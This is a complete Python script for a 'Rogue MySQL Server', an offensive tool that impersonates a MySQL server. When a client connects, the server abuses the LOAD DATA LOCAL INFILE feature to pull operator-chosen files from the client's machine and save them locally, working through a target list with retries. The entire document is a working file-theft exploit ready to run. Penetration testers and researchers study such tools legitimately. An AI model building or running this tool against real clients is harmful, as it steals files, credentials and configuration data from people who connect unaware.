#!/usr/bin/env python

import socket
import asyncore
import asynchat
import struct
import logging
import logging.handlers
import argparse
import os
import sys
import signal

DEBUG = False
PORT = 3306
LOG_FILE = 'rogueSQL.log'
VERBOSE = False
SAVE_FOLDER = os.sep.join(os.path.abspath(__file__).split(os.sep)[:-1]) + os.sep + 'Downloads' + os.sep
ATTEMPTS = 3

# Logging stuff
log = logging.getLogger(__name__)
log.setLevel(logging.INFO)
tmp_format = logging.handlers.WatchedFileHandler(LOG_FILE, 'ab')
tmp_format.setFormatter(logging.Formatter("%(asctime)s:%(levelname)s:%(message)s"))
log.addHandler(
    tmp_format
)

parser = argparse.ArgumentParser(prog='RogueSQL', description='Rogue MySQL server')
parser.add_argument("-p", metavar='port', help='port to run the server on', type=int)
parser.add_argument("-f", metavar='filename', help="specify a single filename to retrieve")
parser.add_argument("-l", metavar='filelist', help="path to file with list of files for download")
parser.add_argument("-a", metavar='attempts', help='how many times to request a file before giving up', type=int)
parser.add_argument("-v", action='store_true', help='toggle verbosity')
parser.add_argument("-d", action='store_true', help='log debug messages')

def handler(sig, frame):
    print('[+] Exiting now...')
    sys.exit(0)

class LastPacket(Exception):
    pass

class OutOfOrder(Exception):
    pass

class mysql_packet(object):
    packet_header = struct.Struct('<HbB')
    packet_header_long = struct.Struct('<HbbB')
    def __init__(self, packet_type, payload):
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            header = mysql_packet.packet_header.pack(payload_len, 0, self.packet_num % 255)
        else:
            header = mysql_packet.packet_header.pack(payload_len & 0xFFFF, payload_len >> 16, 0, self.packet_num % 255)

        result = "{0}{1}".format(
            header,
            self.payload
        )
        return result

    def __repr__(self):
        return repr(str(self))

    @staticmethod
    def parse(raw_data):
        packet_num = ord(raw_data[0])
        payload = raw_data[1:]
        return mysql_packet(packet_num, payload)

class http_request_handler(asynchat.async_chat):

    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.ibuffer = []
        self.filenumber = 0
        self.current_filename = ''
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.logined = False
        self.push(
            mysql_packet(
                0,
                "".join((
                    '\x0a',  # Protocol
                    '5.6.28-0ubuntu0.14.04.1' + '\0',
                    '\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00',
                ))            )
        )

        self.order = 1
        self.states = ['LOGIN', 'CAPS', 'ANY']

    def push(self, data):
        if DEBUG:
            log.debug('Pushed:', data)
        data = str(data)
        asynchat.async_chat.push(self, data)

    def collect_incoming_data(self, data):
        self.ibuffer.append(data)

    def found_terminator(self):
        data = "".join(self.ibuffer)
        self.ibuffer = []

        if self.state == 'LEN':
            len_bytes = ord(data[0]) + 256*ord(data[1]) + 65536*ord(data[2]) + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'
        elif self.state == 'MoreLength':
            if data[0] != '\0':
                self.push(None)
                self.close_when_done()
            else:
                self.state = 'Data'
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if self.order != packet.packet_num:
                    raise OutOfOrder()
                else:
                    self.order = packet.packet_num + 2
                
                if packet.packet_num == 0:
                    global prevFilename
                    global failCount

                    if packet.payload[0] == '\x03':

                        # Set the current file
                        self.current_filename = filelist[self.filenumber]

                        if DEBUG:
                            log.info('Previous request: %s; Next request: %s' % (prevFilename, self.current_filename))
                        
                        if self.current_filename == prevFilename:
                            # Means a failed request previously
                            failCount += 1

                            if failCount != ATTEMPTS:
                                print('[-] Moving on from this file in ' + str(ATTEMPTS - failCount) + ' attempt/s')
                            else:
                                print('[-] Moving on to next file')
                                del filelist[self.filenumber]
                                failCount = 0
                        if len(filelist) == 1:
                            print('[+] End of file list reached')
                            print('[+] Exiting now...')
                            sys.exit(0)

                        self.current_filename = filelist[self.filenumber]

                        PACKET = mysql_packet(
                            packet,
                            '\xFB{0}'.format(self.current_filename)
                        )

                        if DEBUG:
                            log.info('Requesting for file: %s' % self.current_filename)
                        print('[+] Requesting %s' % self.current_filename)

                        prevFilename = self.current_filename
                        
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET)

                    elif packet.payload[0] == '\x1b':
                        if DEBUG:
                            log.info('SelectDB')
                        self.push(mysql_packet(
                            packet,
                            '\xfe\x00\x00\x02\x00'
                        ))
                        raise LastPacket()

                    elif packet.payload[0] in '\x02':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()

                    elif packet.payload == '\x00\x01':
                        self.push(None)
                        self.close_when_done()
                    else:
                        raise ValueError()

                else:
                    # Recieved file handling
                    if self.sub_state == 'File':
                        if len(data) == 1:
                            if packet.packet_num < 256 and self.filenumber < len(filelist) - 1:
                                self.current_filename = filelist[self.filenumber]
                                self.set_terminator(3)
                                self.state = 'LEN'
                                self.sub_state = 'File'
                                self.push(
                                    mysql_packet(packet, '\xFB{0}'.format(self.current_filename))
                                )
                            else:
                                self.push(
                                    mysql_packet(packet, '\0\0\0\x02\0\0\0')
                                )
                                sys.exit(0)
                        else:
                            with open(SAVE_FOLDER + os.path.normpath(self.current_filename).split(os.sep)[-1], 'ab') as fl:
                                fl.write(data)
                                if self.current_filename not in obtained:
                                    print('[+] File %s obtained' % self.current_filename)
                                    obtained.add(self.current_filename)
                                    del filelist[self.filenumber]

                            self.set_terminator(3)
                            self.state = 'LEN'
                            self.order = packet.packet_num + 1

                    elif self.sub_state == 'Auth':
                        self.push(mysql_packet(
                            packet, '\0\0\0\x02\0\0\0'
                        ))
                        raise LastPacket()
                    else:
                        raise ValueError('Unknown packet')

            except LastPacket:
                if DEBUG:
                    log.info('Last packet')
            
                self.state = 'LEN'
                self.sub_state = None
                self.order = 0
                self.set_terminator(3)
            
            except OutOfOrder:
                if DEBUG:
                    log.warning('Packets out of order')
                self.push(None)
                self.close_when_done()
        else:
            if DEBUG:
                log.error('Unknown state')
            self.push('None')
            self.close_when_done()


class mysql_listener(asyncore.dispatcher):
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind(('', PORT))
            except socket.error:
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()

        if pair is not None:
            log.info('Data recieved from: %s' % pair[1][0])
            print('[+] Data recieved from %s' % pair[1][0])
            tmp = http_request_handler(pair)

if __name__ == '__main__':

    filelist = list()
    obtained = set()
    failCount = 0
    prevFilename = ''

    args = parser.parse_args()
    if args.d:
        DEBUG = args.d
    if args.l:
        try:
            filelist += filter(None, open(args.l, 'r').read().split('\n'))
        except IOError:
            print('[-] Error: List file not found')
            sys.exit(1)
    else:
        if not args.f:
            print('[-] Error: No files specified')
            sys.exit(1)
        else:
            filelist.append(args.f)
    if args.p:
        PORT = args.p
    if args.a:
        ATTEMPTS = args.a
    if args.v:
        VERBOSE = args.v
    
    if not os.path.exists(SAVE_FOLDER):
        os.mkdir(SAVE_FOLDER)

    filelist.append('')

    print('Rogue MySQL Server')
    print('[+] Target files:')
    for file in filelist:
        if file is not '': print('\t' + file)

    print('[+] Starting listener on port ' + str(PORT)  + '... Ctrl+C to stop\n')

    listener = mysql_listener() 
    signal.signal(signal.SIGINT, handler)
    asyncore.loop() 
